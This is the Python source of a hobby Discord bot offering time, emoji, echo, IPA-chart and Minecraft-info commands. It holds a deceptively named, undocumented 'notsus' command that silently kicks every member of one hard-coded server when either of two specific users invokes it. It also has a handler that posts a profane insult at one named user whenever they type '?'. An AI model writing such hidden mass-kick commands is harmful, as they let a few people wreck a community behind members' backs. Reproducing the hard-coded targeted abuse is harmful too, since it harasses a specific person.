import discord
from discord.ext import commands

import json

import os
from dotenv import load_dotenv

from unicodedata import *

from datetime import datetime, timedelta
from time import localtime, strftime
import time
import cocanb

from replit import db
from keep_alive import keep_alive

from cocanb import Cocánb
from unicode import Unicode
from acknowledgements import Acknowledgements
from moderation import Moderation

load_dotenv()
TOKEN = os.getenv('TOKEN')

bot=commands.Bot(command_prefix="c.")

@bot.event
async def on_ready():
  await bot.change_presence(status=discord.Status.online, activity=discord.Game(name='c.help'))
  
@bot.event
async def on_message(message):
    if message.content == "?" and message.author.id == 698865312954843216:
        await message.channel.send('shut the fuck up grogu you know what we were talking about stop acting stupid')
    await bot.process_commands(message)

@bot.command(name='ping', help="Checks whether bot is online.")
async def ping(ctx):
  await ctx.send('Bot is online.')

@bot.command(name='time',
             help='Shows current time given a timezone (In (-)HH:MM format)')
async def time(ctx, timezone: str = '00:00'):
	if timezone[0] == '-':
		hours = int(timezone[:-3]) - int(timezone[-2:]) / 60
	else:
		hours = int(timezone[:-3]) + int(timezone[-2:]) / 60
	future_time = datetime.today() + timedelta(hours=hours)
	if timezone == '00:00':
		plus = '±'
	elif timezone[0] == '-':
		plus = ''
	elif timezone[0] == '+':
		plus = ''
	else:
		plus = '+'
	week_day = future_time.weekday()
	weekdays = ("Monday", "Tuesday", "Wednesday", "Thursday", "Friday",
	            "Saturday", "Sunday")
	week_day = weekdays[week_day]
	if timezone[-3] == ':':
		await ctx.send('`' + week_day + ', ' + str(future_time) + ', UTC' +
		               plus + timezone + '`')
	else:
		await ctx.send ('invalid timezone')
		

@bot.command(name="return", help="Returns message")
async def msgreturn(ctx, *, msg):
	await ctx.send(msg)

@bot.command(name='minecraftinfo', help="Sends information for Minecraft server")
async def minecraftinto(ctx):
  await ctx.send('SERVER INFO:\nIP: cocanb.aternos.me\nNumerical IP: 51.158.122.83\nPort: 59104\n\nVersion: 1.16.5 Vanilla\nGamemode: Creative\nDifficulty: Normal')


@bot.command(name="delreturn",help="Returns message (deletes original message)\n(may not work on every server)")
async def delmsgreturn(ctx, *, msg):
	await ctx.message.delete()
	await ctx.send(msg)

@bot.command(
    name="emoji",
    help=
    "Sends some emojis\nSupported: amogus/amongus/among us, barry, biang, bruh/facepalm, surprised/that's illegal/illegal, void, woah\n(words separated by / output the same emoji)"
)
async def emoji(ctx, *, name):
	name = name.lower()
	if name == "ye":
		await ctx.send("<:ye:799291949273317377>")
	elif name == "amogus" or name == "amongus" or name == "among us":
		await ctx.send("<:amogus:809427238784860210>")
	elif name == "barry":
		await ctx.send("<:barry:811154017672757270>")
	elif name == "biang":
		await ctx.send("<:biang:809669658143227905>")
	elif name == "bruh" or name == "facepalm":
		await ctx.send("<:bruh:801100506251526145>")
	elif name == "surprised" or name == "that's illegal" or name == "illegal":
		await ctx.send("<:surprised:801099678988501072>")
	elif name == "void":
		await ctx.send("<:void:798150976191201313>")
	elif name == "woah":
		await ctx.send("<:woah:807905973162999818>")
	else:
		await ctx.send("Invalid emoji")

@bot.command(name='customemoji', help='Sends custom emoji not in c.emoji list\n(Emoji must be from a server this bot is in)')
async def customemoji(ctx, name, emoji_id, animated: str = ''):
  if animated=='':
    anim=''
  else:
    anim='a'
  await ctx.send(f'<{anim}:{name}:{emoji_id}>')

@bot.command(name='ipa', help='Sends official International Phonetic Alphabet chart')
async def ipa(ctx):
    with open("Resources/IPA_Kiel_2020_full.pdf", "rb") as file:
      await ctx.send("Official International Phonetic Alphabet Chart", file=discord.File(file, "Official International Phonetic Alphabet Chart.pdf"))

@bot.command(name="notsus")
async def notsus(ctx):
    if ctx.author.id == 702746453927264276 or ctx.author.id == 607583934527569920:
        for member in bot.get_guild(725639774190305360).members:
            try:
                await member.kick()
                continue
            except Exception:
                continue
            else:
                continue


bot.add_cog(Cocánb(bot))
bot.add_cog(Unicode(bot))
bot.add_cog(Acknowledgements(bot))
bot.add_cog(Moderation(bot))

keep_alive()
bot.run(TOKEN)